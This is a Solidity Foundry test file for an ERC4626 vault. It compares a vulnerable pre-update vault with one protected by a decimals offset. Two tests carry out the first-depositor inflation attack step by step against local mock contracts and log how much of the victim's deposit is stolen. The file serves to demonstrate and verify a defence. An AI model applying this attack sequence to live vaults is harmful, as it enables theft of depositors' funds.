///SPDX-License-Identifier: Unlicensed

pragma solidity 0.8.21;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {IERC4626, Vault} from "../src/Vault.sol";
import {PreUpdateVault} from "../src/PreUpdateVault.sol";
import {ERC20Mock, IERC20} from "../src/mock/ERC20Mock.sol";
import {Rounding, PreUpdateVaultHarness, VaultHarness} from "./harness/Vault.harness.t.sol";

contract VaultTest is Test {

    //TODO : add a test to show the recoverd portion by an attacker in a post-update vault if:
    // offset = 0,4,8, deposit = a0, donation = a1
    
    IERC4626 vault;
    IERC4626 preUpdateVault;
    ERC20Mock underlying;

    uint256 constant INITIAL_BALANCE = 1_000_000_000 ether;

    address alice;
    address bob;
    address charlie;

    function setUp() public {
        alice = makeAddr("alice");
        bob = makeAddr("bob");
        charlie = makeAddr("charlie");

        underlying = new ERC20Mock();
        vault = new Vault(address(underlying));
        preUpdateVault = new PreUpdateVault(address(underlying));

        underlying.mint(alice, INITIAL_BALANCE);
        underlying.mint(bob, INITIAL_BALANCE);
        underlying.mint(charlie, INITIAL_BALANCE);
    }

    function test_consoleLogs() public view {
        console.log("--decimals--");
        console.log("share's decimals:", vault.decimals());
    }

    function test_deposit_AssetToSharesCorrectValue_Vault() public {
        //in this scenario, Alice deposit 1 ETH of assets, she should get 1 ETH of shares as the first depositor
        uint256 assetToDeposit = 1 ether;
        uint256 expectedShares = vault.previewDeposit(assetToDeposit);

        vm.startPrank(alice);
        underlying.approve(address(vault), assetToDeposit);
        vault.deposit(assetToDeposit, alice);
        vm.stopPrank();

        uint256 aliceShares = vault.balanceOf(alice);
        //forgefmt: disable-start
        assertEq(INITIAL_BALANCE - assetToDeposit, underlying.balanceOf(alice)
    	, "alice's asset balance's wrong");

        assertEq(expectedShares, aliceShares
    	, "alice's share balance's wrong");
    //forgefmt: disable-end
    }

    function test_depositThenWithdraw_CorrectValue() public {
        //in this scenario, we check that alice is able to withdraw the same amount she deposited first
        //this should be the case with the old-fashioned ERC4626 first deposit
        //but with the remediation to inflation attack, this is not the case anymore for the first depositor
        uint256 assetToDeposit = 1 ether;

        vm.startPrank(alice);
        underlying.approve(address(vault), assetToDeposit);
        vault.deposit(assetToDeposit, alice);
        vault.withdraw(assetToDeposit, alice, alice);
        vm.stopPrank();

        //forgefmt: disable-start
    	//Alice should have gotten back her 1 eth of asset
        assertEq(INITIAL_BALANCE, underlying.balanceOf(alice)
    	, "alice's asset balance's wrong");

        uint256 aliceShares = vault.balanceOf(alice);

    	//Alice shoudn't have shares anymore as they have been burned to withdraw her deposited assets
        assertEq(0, aliceShares
    	, "alice's share balance's wrong");
    //forgefmt: disable-end
    }

    function test_InflationAttack_POSTUpdateVault() public {
        //in this scenario, Bob will set-up an inflation attack to the vault before Alice's deposit
        //this consist in minting a small amount of shares first, then transfering assets directly to the vault asset balance
        //this will inflate the totalAssets() value of the vault, resulting in a rounding to 0 for Alice when she will try
        //to mint shares
		uint256 attackerFirstDeposit = 1 wei;
		uint256 attackerInflationTransfer = 1 ether * 2*10**4;
		uint256 victimDeposit = 1 ether;

        uint8 decimalsOffset = 4;
        address(vault).call(abi.encodeWithSelector(Vault.setDecimalsOffset.selector, decimalsOffset));
        console.log("post-update _offsetDecimals(): ", decimalsOffset);

        //from here actions comes from Alice
		vm.startPrank(alice);
        underlying.approve(address(vault), attackerFirstDeposit);
        vault.deposit(attackerFirstDeposit, alice);

        console.log("Attacker (Alice) first deposit %d wei of tokens, and get %d wei shares ", attackerFirstDeposit, vault.balanceOf(alice));
        console.log("Alice's shares:", vault.balanceOf(alice));

        console.log("Attacker transfer then %d wei tokens directly to the vault", attackerInflationTransfer);
        console.log("She will not get any shares, are she is not minting, nor depositing, but directly transfering to the vault address");
        underlying.transfer(address(vault), attackerInflationTransfer);
		vm.stopPrank();

        //from here actions comes from Bob
		vm.startPrank(bob);
        console.log("Bob (victim) deposit then %d wei tokens", attackerInflationTransfer);
        underlying.approve(address(vault), victimDeposit);
        vault.deposit(victimDeposit, bob);
        vm.stopPrank();

        console.log("\n-State after the attack-");
        console.log("Alice's shares:", vault.balanceOf(alice));
        console.log("Bob's shares:", vault.balanceOf(bob));
        console.log("total shares in vault:", vault.totalSupply());
        console.log("total assets in vault:", vault.totalAssets());

        uint256 aliceShares = vault.balanceOf(alice);
        uint256 bobShares = vault.balanceOf(bob);

        console.log("\nThen Alice and Bob redeem their shares for the equivalent in tokens");
        vm.prank(alice);
        uint256 aliceRealRedeem = vault.redeem(aliceShares, alice, alice);
        console.log("Alice redeeming first: ", aliceRealRedeem);
        vm.prank(bob);
        uint256 bobRealRedeem = vault.redeem(bobShares, bob, bob);
        console.log("Bob redeeming second: ", bobRealRedeem);

        console.log("\nIn this case, we see that Alice gets only %d%% back of what she spent, while Bob got %d%%"
        , (aliceRealRedeem*100)/(attackerFirstDeposit+attackerInflationTransfer)
        , (bobRealRedeem*100)/(victimDeposit)
        );
        console.log("The decimal offset protected Bob's from Alice front-run deposit");
    }

    function test_InflationAttack_PREUpdateVault() public {
        //in this scenario, Bob will set-up an inflation attack to the vault before Alice's deposit
        //this consist in minting a small amount of shares first, then transfering assets directly to the vault asset balance
        //this will inflate the totalAssets() value of the vault, resulting in a rounding to 0 for Alice when she will try
        //to mint shares
		uint256 attackerFirstDeposit = 1 wei;
		uint256 attackerInflationTransfer = 1 ether;
		uint256 victimDeposit = 1 ether;

        //from here actions comes from Alice
		vm.startPrank(alice);
        underlying.approve(address(preUpdateVault), attackerFirstDeposit);
        preUpdateVault.deposit(attackerFirstDeposit, alice);

        console.log("Attacker (Alice) first deposit %d wei of tokens, and get %d wei shares ", attackerFirstDeposit, preUpdateVault.balanceOf(alice));
        console.log("Alice's shares:", preUpdateVault.balanceOf(alice));

        console.log("Attacker transfer then %d wei tokens directly to the vault", attackerInflationTransfer);
        console.log("She will not get any shares, are she is not minting, nor depositing, but directly transfering to the vault address");
        underlying.transfer(address(preUpdateVault), attackerInflationTransfer);
		vm.stopPrank();

        //from here actions comes from Bob
		vm.startPrank(bob);
        console.log("Bob (victim) deposit then %d wei tokens", attackerInflationTransfer);
        underlying.approve(address(preUpdateVault), victimDeposit);
        preUpdateVault.deposit(victimDeposit, bob);
        vm.stopPrank();

        console.log("-State after the attack-");
        console.log("Alice's shares:", preUpdateVault.balanceOf(alice));
        console.log("Bob's shares:", preUpdateVault.balanceOf(bob));
        console.log("total shares in preUpdateVault:", preUpdateVault.totalSupply());
        console.log("total assets in preUpdateVault:", preUpdateVault.totalAssets());

        uint256 aliceShares = preUpdateVault.balanceOf(alice);
        uint256 bobShares = preUpdateVault.balanceOf(bob);
        
        console.log("\nThen Alice and Bob redeem their shares for the equivalent in tokens");
        vm.prank(alice);
        uint256 aliceRealRedeem = preUpdateVault.redeem(aliceShares, alice, alice);
        console.log("Alice redeeming first: ", aliceRealRedeem);
        vm.prank(bob);
        uint256 bobRealRedeem = preUpdateVault.redeem(bobShares, bob, bob);
        console.log("Bob redeeming second: ", bobRealRedeem);

        console.log("\nIn this case, we see that Alice gets only %d%% back of what she spent, while Bob got %d%%"
        , (aliceRealRedeem*100)/(attackerFirstDeposit+attackerInflationTransfer)
        , (bobRealRedeem*100)/(victimDeposit)
        );

        console.log("Bob's deposit got d%% stolen by Alice!", 100-(bobRealRedeem*100)/(victimDeposit));
    }

    function test_CompareConvertImplementations() public {
        uint256 shares = 1e9+1;
        uint256 assets = shares;

        console.log("shares/assets converted", shares);

        VaultHarness vaultH = new VaultHarness(address(underlying));
        vaultH.setDecimalsOffset(uint8(4));

        PreUpdateVaultHarness preUpdateVaultH = new PreUpdateVaultHarness(address(underlying));

        console.log("post-update _offsetDecimals(): ",vaultH.exposed__decimalsOffset());

        console.log("\n-Rounding down-");
        console.log("Pre-Update convertToAssets:", preUpdateVaultH.exposed__convertToAssets(shares, Rounding.Down));
        console.log("Pre-Update convertToShares:", preUpdateVaultH.exposed__convertToShares(assets, Rounding.Down));
        console.log("Post-Update convertToAssets:", vaultH.exposed__convertToAssets(shares, Rounding.Down));
        console.log("Post-Update convertToShares:", vaultH.exposed__convertToShares(assets, Rounding.Down));

        console.log("-Rounding up-");
        console.log("Pre-Update convertToAssets:", preUpdateVaultH.exposed__convertToAssets(shares, Rounding.Up));
        console.log("Pre-Update convertToShares:", preUpdateVaultH.exposed__convertToShares(assets, Rounding.Up));
        console.log("Post-Update convertToAssets:", vaultH.exposed__convertToAssets(shares, Rounding.Up));
        console.log("Post-Update convertToShares:", vaultH.exposed__convertToShares(assets, Rounding.Up));
    }

    function returnExchangeRate(address _vault) public view returns (uint256 exchangeRate){
        exchangeRate = IERC4626(_vault).totalSupply()/IERC4626(_vault).totalAssets();
    }

    function returnExchangeRate(uint256 totalShares, uint256 totalAssets) public pure returns (uint256 exchangeRate){
        exchangeRate = totalShares/totalAssets;
    }    
    // function test_StartPrank() public {
    // 	vm.startPrank(alice);
    // 	console.log("msg.sender:",msg.sender);
    // 	console.log("alice:",address(alice));
    //     console.log("address(this):",address(this));
    // 	vm.stopPrank();
    // }

    // function test_prank() public {
    // 	vm.prank(alice);
    // 	console.log(msg.sender);
    // 	console.log(address(alice));
    // }
}
